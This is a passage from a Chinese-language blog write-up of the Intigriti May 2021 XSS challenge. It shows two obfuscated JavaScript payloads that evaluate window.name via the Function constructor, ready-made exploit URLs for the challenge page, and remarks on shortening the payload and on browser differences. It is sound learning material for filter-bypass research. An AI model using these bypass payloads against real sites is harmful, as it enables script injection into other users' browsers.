<p>length: 466<br>=&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Payload &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br>[][`${e}`[18]+`${e}`[1]+`${e}`[23]+`e`][`${e}`[5]+`${e}`[1]+`${e}`[25]+`${e}`[18]+`${e}`[6]+`${e}`[13]+`${e[0]}`[0]+`${e}`[5]+`${e}`[6]+`${e}`[1]+`${e}`[13]]`_${`${0&#x2F;0}`[1]+`${e}`[21]+`e`+`${e}`[13]+`${e}`[6]+`${[][`${e}`[18]+`${e}`[1]+`${e}`[23]+`e`]}`[13]+`${e[0]}`[2]+`${e}`[1]+`${e}`[5]+`${e[0]}`[0]+`${e}`[23]+`e`+`${e}`[25]+`${e}`[6]+`.`+`${e[0]}`[2]+`${e}`[1]+`${e}`[23]+`${0&#x2F;0}`[1]+`${e[0]}`[5]+`${e}`[25]+`${[][`${e}`[18]+`${e}`[1]+`${e}`[23]+`e`]}`[14]}`` `<br>=&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; URL &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br><a target="_blank" rel="noopener" href="https://challenge-0521.intigriti.io/captcha.php?c=%5C%5B%5C%5D%5C%5B%5C%60$%7Be%7D%5C%60%5C%5B18%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B1%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B23%5C%5D+%5C%60e%5C%60%5C%5D%5C%5B%5C%60$%7Be%7D%5C%60%5C%5B5%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B1%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B25%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B18%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B6%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B13%5C%5D+%5C%60$%7Be%5C%5B0%5C%5D%7D%5C%60%5C%5B0%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B5%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B6%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B1%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B13%5C%5D%5C%5D%5C%60%5C_$%7B%5C%60$%7B0/0%7D%5C%60%5C%5B1%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B21%5C%5D+%5C%60e%5C%60+%5C%60$%7Be%7D%5C%60%5C%5B13%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B6%5C%5D+%5C%60$%7B%5C%5B%5C%5D%5C%5B%5C%60$%7Be%7D%5C%60%5C%5B18%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B1%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B23%5C%5D+%5C%60e%5C%60%5C%5D%7D%5C%60%5C%5B13%5C%5D+%5C%60$%7Be%5C%5B0%5C%5D%7D%5C%60%5C%5B2%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B1%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B5%5C%5D+%5C%60$%7Be%5C%5B0%5C%5D%7D%5C%60%5C%5B0%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B23%5C%5D+%5C%60e%5C%60+%5C%60$%7Be%7D%5C%60%5C%5B25%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B6%5C%5D+%5C%60.%5C%60+%5C%60$%7Be%5C%5B0%5C%5D%7D%5C%60%5C%5B2%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B1%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B23%5C%5D+%5C%60$%7B0/0%7D%5C%60%5C%5B1%5C%5D+%5C%60$%7Be%5C%5B0%5C%5D%7D%5C%60%5C%5B5%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B25%5C%5D+%5C%60$%7B%5C%5B%5C%5D%5C%5B%5C%60$%7Be%7D%5C%60%5C%5B18%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B1%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B23%5C%5D+%5C%60e%5C%60%5C%5D%7D%5C%60%5C%5B14%5C%5D%7D%5C%60%5C%60%5C%60">https://challenge-0521.intigriti.io/captcha.php?c=\[\]\[\`${e}\`\[18\]%2b\`${e}\`\[1\]%2b\`${e}\`\[23\]%2b\`e\`\]\[\`${e}\`\[5\]%2b\`${e}\`\[1\]%2b\`${e}\`\[25\]%2b\`${e}\`\[18\]%2b\`${e}\`\[6\]%2b\`${e}\`\[13\]%2b\`${e\[0\]}\`\[0\]%2b\`${e}\`\[5\]%2b\`${e}\`\[6\]%2b\`${e}\`\[1\]%2b\`${e}\`\[13\]\]\`\_${\`${0/0}\`\[1\]%2b\`${e}\`\[21\]%2b\`e\`%2b\`${e}\`\[13\]%2b\`${e}\`\[6\]%2b\`${\[\]\[\`${e}\`\[18\]%2b\`${e}\`\[1\]%2b\`${e}\`\[23\]%2b\`e\`\]}\`\[13\]%2b\`${e\[0\]}\`\[2\]%2b\`${e}\`\[1\]%2b\`${e}\`\[5\]%2b\`${e\[0\]}\`\[0\]%2b\`${e}\`\[23\]%2b\`e\`%2b\`${e}\`\[25\]%2b\`${e}\`\[6\]%2b\`.\`%2b\`${e\[0\]}\`\[2\]%2b\`${e}\`\[1\]%2b\`${e}\`\[23\]%2b\`${0/0}\`\[1\]%2b\`${e\[0\]}\`\[5\]%2b\`${e}\`\[25\]%2b\`${\[\]\[\`${e}\`\[18\]%2b\`${e}\`\[1\]%2b\`${e}\`\[23\]%2b\`e\`\]}\`\[14\]}\`\`\`</a></p>
<h3 id="再次縮短"><a href="#再次縮短" class="headerlink" title="再次縮短"></a>再次縮短</h3><p>把上面的結果拿去平台上 submit 之後，作者說目前看到最短的是 376 個字元。我想了一陣子發現想不太到，然後就靈機一動想說：「那來試試看 v 那個方法好了，先不管瀏覽器問題」</p>
<p>幫大家回顧一下瀏覽器問題是什麼，那問題就是如果想用 function to string 的方式拿到 v，Chrome 跟 Firefox 產生的結果不同：</p>
<p>[][‘some’]+’’  </p>
<p>&#x2F;&#x2F; Chrome<br>“function some() { [native code] }”<br>v: index 23  </p>
<p>&#x2F;&#x2F; Firefox<br>“function some() {<br>    [native code]<br>}”<br>v: index 27</p>
<p>所以同一個 payload 無法同時應用在這兩個網頁上面。</p>
<p>先不管這問題的話，產生出來的結果是這樣：</p>
<p>length: 376<br>=&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Payload &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br>[][`${e}`[18]+`${e}`[1]+`${e}`[23]+`e`][`${e}`[5]+`${e}`[1]+`${e}`[25]+`${e}`[18]+`${e}`[6]+`${e}`[13]+`${e[0]}`[0]+`${e}`[5]+`${e}`[6]+`${e}`[1]+`${e}`[13]]`_${`e`+`${[][`${e}`[18]+`${e}`[1]+`${e}`[23]+`e`]}`[23]+`${0&#x2F;0}`[1]+`${e}`[21]+`${[][`${e}`[18]+`${e}`[1]+`${e}`[23]+`e`]}`[13]+`${e}`[25]+`${0&#x2F;0}`[1]+`${e}`[23]+`e`+`${[][`${e}`[18]+`${e}`[1]+`${e}`[23]+`e`]}`[14]}`` `<br>=&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; URL &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br><a target="_blank" rel="noopener" href="https://challenge-0521.intigriti.io/captcha.php?c=%5C%5B%5C%5D%5C%5B%5C%60$%7Be%7D%5C%60%5C%5B18%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B1%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B23%5C%5D+%5C%60e%5C%60%5C%5D%5C%5B%5C%60$%7Be%7D%5C%60%5C%5B5%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B1%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B25%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B18%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B6%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B13%5C%5D+%5C%60$%7Be%5C%5B0%5C%5D%7D%5C%60%5C%5B0%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B5%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B6%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B1%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B13%5C%5D%5C%5D%5C%60%5C_$%7B%5C%60e%5C%60+%5C%60$%7B%5C%5B%5C%5D%5C%5B%5C%60$%7Be%7D%5C%60%5C%5B18%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B1%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B23%5C%5D+%5C%60e%5C%60%5C%5D%7D%5C%60%5C%5B23%5C%5D+%5C%60$%7B0/0%7D%5C%60%5C%5B1%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B21%5C%5D+%5C%60$%7B%5C%5B%5C%5D%5C%5B%5C%60$%7Be%7D%5C%60%5C%5B18%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B1%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B23%5C%5D+%5C%60e%5C%60%5C%5D%7D%5C%60%5C%5B13%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B25%5C%5D+%5C%60$%7B0/0%7D%5C%60%5C%5B1%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B23%5C%5D+%5C%60e%5C%60+%5C%60$%7B%5C%5B%5C%5D%5C%5B%5C%60$%7Be%7D%5C%60%5C%5B18%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B1%5C%5D+%5C%60$%7Be%7D%5C%60%5C%5B23%5C%5D+%5C%60e%5C%60%5C%5D%7D%5C%60%5C%5B14%5C%5D%7D%5C%60%5C%60%5C%60">https://challenge-0521.intigriti.io/captcha.php?c=\[\]\[\`${e}\`\[18\]%2b\`${e}\`\[1\]%2b\`${e}\`\[23\]%2b\`e\`\]\[\`${e}\`\[5\]%2b\`${e}\`\[1\]%2b\`${e}\`\[25\]%2b\`${e}\`\[18\]%2b\`${e}\`\[6\]%2b\`${e}\`\[13\]%2b\`${e\[0\]}\`\[0\]%2b\`${e}\`\[5\]%2b\`${e}\`\[6\]%2b\`${e}\`\[1\]%2b\`${e}\`\[13\]\]\`\_${\`e\`%2b\`${\[\]\[\`${e}\`\[18\]%2b\`${e}\`\[1\]%2b\`${e}\`\[23\]%2b\`e\`\]}\`\[23\]%2b\`${0/0}\`\[1\]%2b\`${e}\`\[21\]%2b\`${\[\]\[\`${e}\`\[18\]%2b\`${e}\`\[1\]%2b\`${e}\`\[23\]%2b\`e\`\]}\`\[13\]%2b\`${e}\`\[25\]%2b\`${0/0}\`\[1\]%2b\`${e}\`\[23\]%2b\`e\`%2b\`${\[\]\[\`${e}\`\[18\]%2b\`${e}\`\[1\]%2b\`${e}\`\[23\]%2b\`e\`\]}\`\[14\]}\`\`\`</a></p>
<p>376 個字，跟剛剛的 466 比起來少了快一百個。</p>
<p>用來產生的完整程式碼：</p>
<p>有些人可能不知道為什麼 <code>eval(name)</code> 可以，這是因為 <code>window.name</code> 是個神奇的屬性，基本上同一個分頁的 name 會相同，所以我們只要自己新建一個 html，裡面寫 JS 並且設定 <code>window.name = &#39;alert(document.domain)&#39;</code>，然後用 <code>location=</code> 跳轉到 PHP 那邊，那裡的 <code>name</code> 就會是我們剛剛設定好的。</p>
<p>沒錯，跨網域也適用。</p>
<p>因為我最後試出來的結果也是 376 個字，跟作者說的最短 payload 相同，詢問過後發現其實就是同一個。</p>
<h3 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h3><p>從這個挑戰中可以學到一些 JS 相關的東西，像是：</p>
<ol>
<li>在限制之下湊出指定字元</li>
<li>用反引號 backtick 來呼叫函式以及參數的規則</li>
<li>用 function constructor 動態建立函式</li>
</ol>
<p>這些知識在什麼時候會有用呢？對攻擊者而言，當你碰到一個有過濾字元的地方的時候，就可以利用這些技巧想辦法繞過限制。</p>
<p>對防禦方來說，在過濾時就需要考量到這些繞過的方法，如果知道可以這樣繞過，就能把 filter 訂得更精確。</p>
<p>不過這都只是後話，對我來說會解這些題目只是因為好玩，也沒有去想說會有什麼幫助，那些都是以後的事了。</p>
<p>這個平台每個月都會有 XSS 挑戰，期待之後的更多挑戰！</p>
</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><a class="button is-default" href="/2021/06/25/update-settings-before-publish-on-medium-d2993706a9b0/" title="簡單介紹發布 Medium 文章前可以改的東西"><i class="iconfont icon-prev mr-2 has-text-grey"></i><span class="has-text-weight-semibold">上一頁: 簡單介紹發布 Medium 文章前可以改的東西</span></a><a class="button is-default" href="/2021/06/05/byebye-front-end-hi-security-fda6be0cb7ce/" title="暫別前端，重新開始"><span class="has-text-weight-semibold">下一頁: 暫別前端，重新開始</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="Haojen/abc" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/aszx87410"><i class="iconfont icon-github"></i></a><!-- Ins--><!-- RSS--><a title="rss" target="_blank" rel="noopener nofollow" href="/atom.xml"><i class="iconfont icon-rss"></i></a><!-- 知乎--><!-- 领英--><!-- 脸书--><a title="facebook" target="_blank" rel="noopener nofollow" href="//www.facebook.com/huli.blog"><i class="iconfont icon-tian7_facebook"></i></a></section><p><span>Copyright ©</span><span> Huli 2023</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/jquery-3.6.1.min.js"></script><script src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>